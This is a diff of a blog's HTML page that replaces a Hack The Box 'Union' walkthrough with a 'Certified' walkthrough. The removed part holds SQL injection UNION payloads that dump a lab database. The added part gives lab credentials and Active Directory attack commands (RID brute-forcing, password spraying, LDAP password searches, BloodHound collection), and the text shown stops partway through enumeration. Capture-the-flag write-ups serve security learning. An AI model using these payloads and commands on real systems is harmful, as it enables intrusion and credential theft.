@@ -8,14 +8,14 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <meta http-equiv="X-UA-Compatible" content="ie=edge" />
   
-  <title>Union Walkthrough(HTB) &middot; Secure The Throne</title>
-  <meta name="title" content="Union Walkthrough(HTB) &middot; Secure The Throne" />
+  <title>Certified Walkthrough(HTB) &middot; Secure The Throne</title>
+  <meta name="title" content="Certified Walkthrough(HTB) &middot; Secure The Throne" />
   
-  <meta name="description" content="Union is an medium difficulty linux machine featuring a web application that is vulnerable to SQL Injection. There are filters in place which prevent SQLMap from dumping the database. Users are intended to manually craft union statements to extract information from the database and website source code. The database contains a flag that can be used to authenticate against the machine and upon authentication the webserver runs an iptables command to enable port 22. The credentials for SSH are in the PHP Configuration file used to authenticate against MySQL. Once on the machine, users can examine the source code of the web application and find out by setting the X-FORWARDED-FOR header, they can perform command injection on the system command used by the webserver to whitelist IP Addresses." />
-  <meta name="keywords" content="medium, Linux, HTB, hacking, Web, Walkthrough, " />
+  <meta name="description" content="A straight forward walkthrough for Certified hack the box machine" />
+  <meta name="keywords" content="Medium, Windows, HTB, hacking, Active Directory, Walkthrough, " />
   
   
-  <link rel="canonical" href="http://localhost:1313/Secure-The-Throne/posts/1741809498520-union-walkthroughhtb/" />
+  <link rel="canonical" href="http://localhost:1313/Secure-The-Throne/posts/1742035934336-certified-walkthroughhtb/" />
   
   
   
@@ -69,32 +69,28 @@
   
   
   
-  <meta property="og:url" content="http://localhost:1313/Secure-The-Throne/posts/1741809498520-union-walkthroughhtb/">
+  <meta property="og:url" content="http://localhost:1313/Secure-The-Throne/posts/1742035934336-certified-walkthroughhtb/">
   <meta property="og:site_name" content="Secure The Throne">
-  <meta property="og:title" content="Union Walkthrough(HTB)">
-  <meta property="og:description" content="Union is an medium difficulty linux machine featuring a web application that is vulnerable to SQL Injection. There are filters in place which prevent SQLMap from dumping the database. Users are intended to manually craft union statements to extract information from the database and website source code. The database contains a flag that can be used to authenticate against the machine and upon authentication the webserver runs an iptables command to enable port 22. The credentials for SSH are in the PHP Configuration file used to authenticate against MySQL. Once on the machine, users can examine the source code of the web application and find out by setting the X-FORWARDED-FOR header, they can perform command injection on the system command used by the webserver to whitelist IP Addresses.">
+  <meta property="og:title" content="Certified Walkthrough(HTB)">
+  <meta property="og:description" content="A straight forward walkthrough for Certified hack the box machine">
   <meta property="og:locale" content="en">
   <meta property="og:type" content="article">
     <meta property="article:section" content="posts">
-    <meta property="article:published_time" content="2025-03-13T00:00:00+00:00">
-    <meta property="article:modified_time" content="2025-03-13T00:00:00+00:00">
+    <meta property="article:published_time" content="2025-03-15T00:00:00+00:00">
+    <meta property="article:modified_time" content="2025-03-15T00:00:00+00:00">
     <meta property="article:tag" content="Medium">
-    <meta property="article:tag" content="Linux">
+    <meta property="article:tag" content="Windows">
     <meta property="article:tag" content="HTB">
     <meta property="article:tag" content="Hacking">
-    <meta property="article:tag" content="Web">
+    <meta property="article:tag" content="Active Directory">
     <meta property="article:tag" content="Walkthrough">
-    <meta property="og:image" content="http://localhost:1313/Secure-The-Throne/posts/1741809498520-union-walkthroughhtb/featured.jpeg">
-      <meta property="og:see_also" content="http://localhost:1313/Secure-The-Throne/posts/1741808245229-perfection-walkthroughhtb/">
-      <meta property="og:see_also" content="http://localhost:1313/Secure-The-Throne/posts/1741762551259-caption-walkthroughhtb/">
-      <meta property="og:see_also" content="http://localhost:1313/Secure-The-Throne/posts/1741592170890-backend-walkthroughhtb/">
-      <meta property="og:see_also" content="http://localhost:1313/Secure-The-Throne/posts/1741345035294-forest-writeuphtb/">
+    <meta property="og:image" content="http://localhost:1313/Secure-The-Throne/posts/1742035934336-certified-walkthroughhtb/featured.jpeg">
 
   
   <meta name="twitter:card" content="summary_large_image">
-  <meta name="twitter:image" content="http://localhost:1313/Secure-The-Throne/posts/1741809498520-union-walkthroughhtb/featured.jpeg">
-  <meta name="twitter:title" content="Union Walkthrough(HTB)">
-  <meta name="twitter:description" content="Union is an medium difficulty linux machine featuring a web application that is vulnerable to SQL Injection. There are filters in place which prevent SQLMap from dumping the database. Users are intended to manually craft union statements to extract information from the database and website source code. The database contains a flag that can be used to authenticate against the machine and upon authentication the webserver runs an iptables command to enable port 22. The credentials for SSH are in the PHP Configuration file used to authenticate against MySQL. Once on the machine, users can examine the source code of the web application and find out by setting the X-FORWARDED-FOR header, they can perform command injection on the system command used by the webserver to whitelist IP Addresses.">
+  <meta name="twitter:image" content="http://localhost:1313/Secure-The-Throne/posts/1742035934336-certified-walkthroughhtb/featured.jpeg">
+  <meta name="twitter:title" content="Certified Walkthrough(HTB)">
+  <meta name="twitter:description" content="A straight forward walkthrough for Certified hack the box machine">
 
   
   <script type="application/ld+json">
@@ -102,26 +98,26 @@
     "@context": "https://schema.org",
     "@type": "Article",
     "articleSection": "Posts",
-    "name": "Union Walkthrough(HTB)",
-    "headline": "Union Walkthrough(HTB)",
-    "description": "Union is an medium difficulty linux machine featuring a web application that is vulnerable to SQL Injection. There are filters in place which prevent SQLMap from dumping the database. Users are intended to manually craft union statements to extract information from the database and website source code. The database contains a flag that can be used to authenticate against the machine and upon authentication the webserver runs an iptables command to enable port 22. The credentials for SSH are in the PHP Configuration file used to authenticate against MySQL. Once on the machine, users can examine the source code of the web application and find out by setting the X-FORWARDED-FOR header, they can perform command injection on the system command used by the webserver to whitelist IP Addresses.",
+    "name": "Certified Walkthrough(HTB)",
+    "headline": "Certified Walkthrough(HTB)",
+    "description": "A straight forward walkthrough for Certified hack the box machine",
     
     "inLanguage": "en",
-    "url" : "http:\/\/localhost:1313\/Secure-The-Throne\/posts\/1741809498520-union-walkthroughhtb\/",
+    "url" : "http:\/\/localhost:1313\/Secure-The-Throne\/posts\/1742035934336-certified-walkthroughhtb\/",
     "author" : {
       "@type": "Person",
       "name": "Emp5r0R"
     },
     "copyrightYear": "2025",
-    "dateCreated": "2025-03-13T00:00:00\u002b00:00",
-    "datePublished": "2025-03-13T00:00:00\u002b00:00",
+    "dateCreated": "2025-03-15T00:00:00\u002b00:00",
+    "datePublished": "2025-03-15T00:00:00\u002b00:00",
     
-    "dateModified": "2025-03-13T00:00:00\u002b00:00",
+    "dateModified": "2025-03-15T00:00:00\u002b00:00",
     
-    "keywords": ["medium","Linux","HTB","hacking","Web","Walkthrough"],
+    "keywords": ["Medium","Windows","HTB","hacking","Active Directory","Walkthrough"],
     
     "mainEntityOfPage": "true",
-    "wordCount": "940"
+    "wordCount": "886"
   }]
   </script>
 
@@ -612,7 +608,7 @@
 
     
     <div class="fixed inset-x-0 top-0 h-[800px] single_hero_background nozoom"
-    style="background-image:url(/Secure-The-Throne/posts/1741809498520-union-walkthroughhtb/featured_hu_5e43b61bfb71a7a4.jpeg);">
+    style="background-image:url(/Secure-The-Throne/posts/1742035934336-certified-walkthroughhtb/featured_hu_cf5aa035ed124616.jpeg);">
     
 
 
@@ -638,7 +634,7 @@
   <header id="single_header" class="mt-5 max-w-prose">
     
     <h1 class="mt-0 text-4xl font-extrabold text-neutral-900 dark:text-neutral">
-      Union Walkthrough(HTB)
+      Certified Walkthrough(HTB)
     </h1>
     <div class="mt-1 mb-6 text-base text-neutral-500 dark:text-neutral-400 print:hidden">
       
@@ -685,7 +681,7 @@
 <div class="flex flex-row flex-wrap items-center">
   
   
-  <time datetime="2025-03-13T00:00:00&#43;00:00">13 March 2025</time><span class="px-2 text-primary-500">&middot;</span><span>940 words</span><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">5 mins</span><span class="px-2 text-primary-500">&middot;</span>
+  <time datetime="2025-03-15T00:00:00&#43;00:00">15 March 2025</time><span class="px-2 text-primary-500">&middot;</span><span>886 words</span><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">5 mins</span><span class="px-2 text-primary-500">&middot;</span>
 
 
 <script type="text/javascript" src="/Secure-The-Throne/js/zen-mode.min.eea5245cf9244ecbdf2c150d1c8833226c1541cadf6e98f63a7c9192b1a3676df2c3ec603b14f4cfaaa53971fd9d8955640c0f405bf3de2b43ee7a5fb29ae721.js" integrity="sha512-7qUkXPkkTsvfLBUNHIgzImwVQcrfbpj2OnyRkrGjZ23yw&#43;xgOxT0z6qlOXH9nYlVZAwPQFvz3itD7npfsprnIQ=="></script>
@@ -752,10 +748,10 @@
 </span>
   </span>
   
-  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/Secure-The-Throne/tags/linux/&#34;,'_self');return false;">
+  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/Secure-The-Throne/tags/windows/&#34;,'_self');return false;">
     <span class="flex" style="cursor: pointer;">
   <span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
-    Linux
+    Windows
   </span>
 </span>
   </span>
@@ -776,10 +772,10 @@
 </span>
   </span>
   
-  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/Secure-The-Throne/tags/web/&#34;,'_self');return false;">
+  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/Secure-The-Throne/tags/active-directory/&#34;,'_self');return false;">
     <span class="flex" style="cursor: pointer;">
   <span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
-    Web
+    Active Directory
   </span>
 </span>
   </span>
@@ -952,9 +948,27 @@
     class="min-w-[220px] py-2 border-dotted ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
     <nav id="TableOfContents">
   <ul>
-    <li><a href="#reconnaissance--enumeration">Reconnaissance &amp; Enumeration</a></li>
-    <li><a href="#exploitation">Exploitation</a></li>
-    <li><a href="#privilege-escalation">Privilege Escalation</a></li>
+    <li><a href="#reconnaissance">Reconnaissance</a></li>
+    <li><a href="#enumeration">Enumeration</a></li>
+    <li><a href="#exploitation">Exploitation</a>
+      <ul>
+        <li>
+          <ul>
+            <li><a href="#writeowner-abuse">WriteOwner Abuse</a></li>
+            <li><a href="#genericwrite-abuse">GenericWrite Abuse</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#privilege-escalation">Privilege Escalation</a>
+      <ul>
+        <li>
+          <ul>
+            <li><a href="#abusing-the-ad-cs">Abusing the AD CS</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
   </ul>
 </nav>
   </div>
@@ -968,9 +982,27 @@
     class="py-2 border-dotted border-neutral-300 ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
     <nav id="TableOfContents">
   <ul>
-    <li><a href="#reconnaissance--enumeration">Reconnaissance &amp; Enumeration</a></li>
-    <li><a href="#exploitation">Exploitation</a></li>
-    <li><a href="#privilege-escalation">Privilege Escalation</a></li>
+    <li><a href="#reconnaissance">Reconnaissance</a></li>
+    <li><a href="#enumeration">Enumeration</a></li>
+    <li><a href="#exploitation">Exploitation</a>
+      <ul>
+        <li>
+          <ul>
+            <li><a href="#writeowner-abuse">WriteOwner Abuse</a></li>
+            <li><a href="#genericwrite-abuse">GenericWrite Abuse</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#privilege-escalation">Privilege Escalation</a>
+      <ul>
+        <li>
+          <ul>
+            <li><a href="#abusing-the-ad-cs">Abusing the AD CS</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
   </ul>
 </nav>
   </div>
@@ -1049,377 +1081,149 @@
       <div class="min-w-0 min-h-0 max-w-fit">
         
         
-<details style="margin-left:0px" class="mt-2 mb-5 overflow-hidden rounded-lg ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5" >
-    
-    <summary
-        class="py-1 text-lg font-semibold cursor-pointer bg-primary-200 text-neutral-800 ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 dark:bg-primary-800 dark:text-neutral-100">
-        Hack The Box - This article is part of a series.
-    </summary>
-    
-    
-    
-    <div
-        class="py-1 border-dotted border-neutral-300 ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
-        <a href="http://localhost:1313/Secure-The-Throne/posts/1741345035294-forest-writeuphtb/">
-            Part 1: Forest Walkthrough(HTB)
-        </a>
-    </div>
-    
-    
-    
-    <div
-        class="py-1 border-dotted border-neutral-300 ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
-        <a href="http://localhost:1313/Secure-The-Throne/posts/1741592170890-backend-walkthroughhtb/">
-            Part 2: Backend Walkthrough(HTB)
-        </a>
-    </div>
-    
-    
-    
-    <div
-        class="py-1 border-dotted border-neutral-300 ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
-        <a href="http://localhost:1313/Secure-The-Throne/posts/1741762551259-caption-walkthroughhtb/">
-            Part 3: Caption Walkthrough(HTB)
-        </a>
-    </div>
-    
-    
-    
-    <div
-        class="py-1 border-dotted border-neutral-300 ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
-        <a href="http://localhost:1313/Secure-The-Throne/posts/1741808245229-perfection-walkthroughhtb/">
-            Part 4: Perfection Walkthrough(HTB)
-        </a>
-    </div>
-    
-    
-    
-    <div
-        class="py-1 border-dotted border-neutral-300 ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
-        Part 5: This Article
-    </div>
-    
-    
-
-
-</details>
-
 
 
         <div class="article-content max-w-prose mb-20">
           
 
-<h2 class="relative group">Reconnaissance &amp; Enumeration 
-    <div id="reconnaissance--enumeration" class="anchor"></div>
+<h2 class="relative group">Reconnaissance 
+    <div id="reconnaissance" class="anchor"></div>
     
     <span
         class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
         <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
-            style="text-decoration-line: none !important;" href="#reconnaissance--enumeration" aria-label="Anchor">#</a>
+            style="text-decoration-line: none !important;" href="#reconnaissance" aria-label="Anchor">#</a>
     </span>        
     
 </h2>
 <ul>
-<li>Nmap scan results</li>
-</ul>
-<pre tabindex="0"><code>PORT   STATE SERVICE VERSION
-80/tcp open  http    nginx 1.18.0 (Ubuntu)
-| http-methods: 
-|_  Supported Methods: GET HEAD POST
-| http-cookie-flags: 
-|   /: 
-|     PHPSESSID: 
-|_      httponly flag not set
-|_http-server-header: nginx/1.18.0 (Ubuntu)
-|_http-title: Site doesn&#39;t have a title (text/html; charset=UTF-8).
-</code></pre><ul>
-<li>Interesting isn&rsquo;t it, we got opnly one port-80 open</li>
-<li>In the scan itslef we can see the <code>PHPSESSID</code> cookie, So, this is a PHP made website</li>
-<li>I eventually got bored looking at the website so fired up a subdomain scan and got no results
+<li>We got multiple ports open, Which is interesting
 
   <figure>
-    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250113000957.png?raw=true" alt="Pasted image 20250113000957.png" />
+    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250101141920.png?raw=true" alt="Pasted image 20250101141920.png" />
     
   </figure>
 </li>
-<li>After many unsuccessful attempts, as this is a PHP website I convinced myself to run a directory fuzzing with php extension</li>
-</ul>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ffuf -u http://union.htb/FUZZ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -e .php -t <span class="m">60</span>
-</span></span></code></pre></div><ul>
-<li>Got some interesting results
+<li>Out of curiosity I fired up a nmap scan and it turns out there are other ports open too
 
   <figure>
-    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250113001145.png?raw=true" alt="Pasted image 20250113001145.png" />
+    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250101142533.png?raw=true" alt="Pasted image 20250101142533.png" />
     
   </figure>
 </li>
-<li><code>firewall.php</code> seems interesting but on accessing the page it&rsquo;s throwing errors, just now I was happy
-
-  <figure>
-    <img class="my-0 rounded-md" loading="lazy" src="https://media1.tenor.com/m/bKuF5df_YnkAAAAd/samob%C3%B3jstwo-cyanide-and-happiness.gif" alt="joy-killer" />
-    
-  </figure>
-</li>
-<li>This website has a Username check option if the username valid or did not present in the database then It will provide a link to <code>challenge.php</code>, there we have to submit some kind of flag. This is how the website works</li>
-<li>This username check parameter seems to be vulnerable to SQL injection. If you have no idea about SQL Injection, I have a small post for that, first check that and then come back here.
-
-<section class="space-y-10 w-full">
-    
-    
-        
-            
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-  <a class="flex flex-wrap article " href="/Secure-The-Throne/posts/1741343014156-sql-injection/">
-    
-        
-        <div class="w-full md:w-auto h-full thumbnail nozoom thumbnailshadow md:mr-7" style="background-image:url(/Secure-The-Throne/posts/1741343014156-sql-injection/featured_hu_c9e8eb4a914d0720.jpg);"></div>
-        
-      <div class=" mt-3 md:mt-0">
-      <div class="items-center text-left text-xl font-semibold">
-        
-        <div class="font-bold text-xl text-neutral-800 decoration-primary-500 hover:underline hover:underline-offset-2 dark:text-neutral"
-          href="/Secure-The-Throne/posts/1741343014156-sql-injection/">SQl-Injection</div>
-        
-        
-        
-      </div>
-      <div class="text-sm text-neutral-500 dark:text-neutral-400">
-        
-
-
-
-
-
-
-
-
-
-
-
-  
-
-
-
-
-
-  
-
-
-
-  
-
-
-
-
-
-
-
-
-
-
-
-
-
-<div class="flex flex-row flex-wrap items-center">
-  
-  
-  <time datetime="2025-03-07T00:00:00&#43;00:00">7 March 2025</time><span class="px-2 text-primary-500">&middot;</span><span>177 words</span><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">1 min</span>
-  
-
-  
-  
-</div>
-
-
-<div class="flex flex-row flex-wrap items-center">
-  
-  
-  
-  
-  
-  
-  
-  
-  
-  
-  
-</div>
-
-
-
-
-<div class="flex flex-row flex-wrap items-center">
-  
-  
-  
-  
-  
-  
-  
-  
-  
-  
-  
-  
-  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/Secure-The-Throne/tags/hacking/&#34;,'_self');return false;">
-    <span class="flex" style="cursor: pointer;">
-  <span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
-    Hacking
-  </span>
-</span>
-  </span>
-  
-  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/Secure-The-Throne/tags/server/&#34;,'_self');return false;">
-    <span class="flex" style="cursor: pointer;">
-  <span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
-    Server
-  </span>
-</span>
-  </span>
-  
-  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/Secure-The-Throne/tags/web/&#34;,'_self');return false;">
-    <span class="flex" style="cursor: pointer;">
-  <span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
-    Web
-  </span>
-</span>
-  </span>
-  
-  
-  
-  
-</div>
-
-
-
-
-      </div>
-      
-      <div class="py-1 max-w-fit prose dark:prose-invert">
-        
-      </div>
-      
-    </div>
-  </a>
-
-        
-    
-</section></li>
-<li>When I input this payload I got different error</li>
+<li>For this box they gave credentials as well</li>
+<li>Username: <code>judith.mader</code> Password: <code>judith09</code></li>
+<li>Total open ports:</li>
 </ul>
-<pre tabindex="0"><code>&#39;OR 1=1; -- -
-</code></pre><p>
-  <figure>
-    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250113001145.png?raw=true" alt="Pasted image 20250113001954.png" />
-    
-  </figure>
-</p>
-<ul>
-<li>There is a firewall running on this web page so SQLMap will not work, Thus we have to do all the work manually
-
-  <figure>
-    <img class="my-0 rounded-md" loading="lazy" src="https://media1.tenor.com/m/o6gmreNhiwwAAAAC/so-much-to-do-too-much-to-do.gif" alt="too-much-of-work" />
-    
-  </figure>
-</li>
-<li>While I was spamming with SQLi payloads I got an Interesting response for this payload</li>
-</ul>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-SQL" data-lang="SQL"><span class="line"><span class="cl"><span class="s1">&#39; UNION select user(); -- -
-</span></span></span></code></pre></div><p>
-  <figure>
-    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250113002241.png?raw=true" alt="Pasted image 20250113002241.png" />
-    
-  </figure>
-</p>
-<ul>
-<li>To get the Info about databases, We can use this payload</li>
-</ul>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-SQL" data-lang="SQL"><span class="line"><span class="cl"><span class="s1">&#39; UNION select group_concat(SCHEMA_NAME) from INFORMATION_SCHEMA.schemata; -- -
-</span></span></span></code></pre></div><ul>
-<li><strong>Output:</strong></li>
-</ul>
-<pre tabindex="0"><code>Sorry, mysql,information_schema,performance_schema,sys,november you are not eligible due to already qualifying.
-</code></pre><ul>
-<li>We got five databases in the corresponding response but <code>november</code> seems more interesting, So lets see what&rsquo;s inside of it
-
-  <figure>
-    <img class="my-0 rounded-md" loading="lazy" src="https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExeHRzNHNkZ2hvejg0aWN1YnljYXN5dHF2OTNsdTBjMjZqOHQ3ajBmaSZlcD12MV9naWZzX3NlYXJjaCZjdD1n/KtJJVm1owcKs0Pil78/giphy.gif" alt="whats-inside" />
-    
-  </figure>
-</li>
-</ul>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="s1">&#39; UNION select group_concat(table_name) from INFORMATION_SCHEMA.tables where table_schema=&#39;</span><span class="n">november</span><span class="s1">&#39;; -- -
-</span></span></span></code></pre></div><ul>
-<li><strong>Output:</strong></li>
-</ul>
-<pre tabindex="0"><code>Sorry, flag,players you are not eligible due to already qualifying.
-</code></pre><ul>
-<li>We got what we needed <code>november</code> database has two tables, lets go in further</li>
-</ul>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="s1">&#39; UNION select group_concat(table_name, &#39;</span><span class="p">:</span><span class="s1">&#39;, column_name) from INFORMATION_SCHEMA.columns where table_schema=&#39;</span><span class="n">november</span><span class="s1">&#39;; -- -
-</span></span></span></code></pre></div><ul>
-<li><strong>Output:</strong></li>
-</ul>
-<pre tabindex="0"><code>Sorry, flag:one,players:player you are not eligible due to already qualifying.
-</code></pre><ul>
-<li>Each of the tables had only one column. For now I am going for <code>flag</code> table. Let&rsquo;s see&hellip;</li>
-</ul>
-<pre tabindex="0"><code>&#39; UNION select group_concat(one) from flag; -- -
-</code></pre><ul>
-<li><strong>Output:</strong></li>
-</ul>
-<pre tabindex="0"><code>Sorry, &lt;redacted&gt; you are not eligible due to already qualifying.
-</code></pre><ul>
-<li>I Got the flag not the HTB user flag but the platform flag for this box and after submission of the flag, the websit firewalls lifted and port 22 is now accessible
-
-  <figure>
-    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250113003834.png?raw=true" alt="Pasted image 20250113003834.png" />
-    
-  </figure>
-</li>
-<li>Lets confirm this by a simple nmap scan on port <code>22</code></li>
-</ul>
-<pre tabindex="0"><code>❯ nmap -p 22 -A 10.10.11.128                            
-Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-12 23:42 IST
-Nmap scan report for union.htb (10.10.11.128)
-Host is up (0.18s latency).
-
-PORT   STATE SERVICE VERSION
-22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
-| ssh-hostkey: 
-|   3072 ea:84:21:a3:22:4a:7d:f9:b5:25:51:79:83:a4:f5:f2 (RSA)
-|   256 b8:39:9e:f4:88:be:aa:01:73:2d:10:fb:44:7f:84:61 (ECDSA)
-|_  256 22:21:e9:f4:85:90:87:45:16:1f:73:36:41:ee:3b:32 (ED25519)
-</code></pre><ul>
-<li>Ok now let&rsquo;s continue with the SQLi, first I checked for the other tables and got the users info</li>
-</ul>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="s1">&#39; UNION select group_concat(player) from players; -- -
-</span></span></span></code></pre></div><ul>
-<li><strong>Output:</strong></li>
-</ul>
-<pre tabindex="0"><code>Sorry, ippsec,celesian,big0us,luska,tinyboy you are not eligible due to already qualifying.
+<pre tabindex="0"><code>Open 10.10.11.41:53
+Open 10.10.11.41:88
+Open 10.10.11.41:135
+Open 10.10.11.41:139
+Open 10.10.11.41:389
+Open 10.10.11.41:445
+Open 10.10.11.41:464
+Open 10.10.11.41:593
+Open 10.10.11.41:636
+Open 10.10.11.41:3268
+Open 10.10.11.41:3269
+Open 10.10.11.41:5985
+Open 10.10.11.41:9389
+Open 10.10.11.41:49668
+Open 10.10.11.41:49666
+Open 10.10.11.41:49673
+Open 10.10.11.41:49674
+Open 10.10.11.41:49683
+Open 10.10.11.41:49716
+Open 10.10.11.41:49739
+Open 10.10.11.41:59780
 </code></pre>
+
+<h2 class="relative group">Enumeration 
+    <div id="enumeration" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#enumeration" aria-label="Anchor">#</a>
+    </span>        
+    
+</h2>
+<ul>
+<li>As usual for starters I checked the smb shares of user judith</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">netexec smb certified.htb -u judith.mader -p judith09 --shares
+</span></span></code></pre></div><p>
+  <figure>
+    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250101144435.png?raw=true" alt="Pasted image 20250101144435.png" />
+    
+  </figure>
+</p>
+<ul>
+<li>Smb shares for this user, didn&rsquo;t had anything intersting.</li>
+<li>As usual I enumerated users from SMB</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">netexec smb certified.htb -u judith.mader -p judith09 --rid-brute &gt;&gt; users-earlier.txt
+</span></span></code></pre></div><ul>
+<li>Removed the unnecessary fields from the netexec output</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">cat users-earlier.txt<span class="p">|</span> grep <span class="s2">&#34;SidTypeUser&#34;</span> <span class="p">|</span> cut -d <span class="s1">&#39;\&#39;</span> -f <span class="m">2</span> <span class="p">|</span> cut -d <span class="s1">&#39;(&#39;</span> -f <span class="m">1</span> &gt;&gt; users.txt
+</span></span></code></pre></div><p>
+  <figure>
+    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250101155355.png?raw=true" alt="Pasted image 20250101155355.png" />
+    
+  </figure>
+</p>
+<ul>
+<li>Then I testing for password reuse using password sprying attack</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">netexec smb certified.htb -u users.txt -p judith09 --continue-on-success
+</span></span></code></pre></div><ul>
+<li>Got nothing useful, seems It&rsquo;s not that easy
+
+  <figure>
+    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250101155625.png?raw=true" alt="Pasted image 20250101155625.png" />
+    
+  </figure>
+</li>
+<li>Searched LDAP for anything interesting and found nothing</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ldapsearch -H ldap://certified.htb -D <span class="s1">&#39;judith.mader@certified.htb&#39;</span> -w <span class="s1">&#39;judith09&#39;</span> -b <span class="s2">&#34;DC=certified,DC=htb&#34;</span> <span class="p">|</span> grep <span class="s2">&#34;pass&#34;</span>
+</span></span></code></pre></div><p>
+  <figure>
+    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250101195514.png?raw=true" alt="Pasted image 20250101195514.png" />
+    
+  </figure>
+
+
+  <figure>
+    <img class="my-0 rounded-md" loading="lazy" src="https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExN3RxM2I1MXcwcG5lcXNxZXlrNjdsbHB0dDlmNmF5MzY0aG90M3c3MSZlcD12MV9naWZzX3NlYXJjaCZjdD1n/f6W3eijFZUIwiNY0xp/giphy.gif" alt="nothing" />
+    
+  </figure>
+</p>
+<ul>
+<li>So atlast I collected bloodhound data</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">bloodhound-python -c ALL -u judith.mader -p judith09 -d certified.htb -ns 10.10.11.41
+</span></span></code></pre></div><p>
+  <figure>
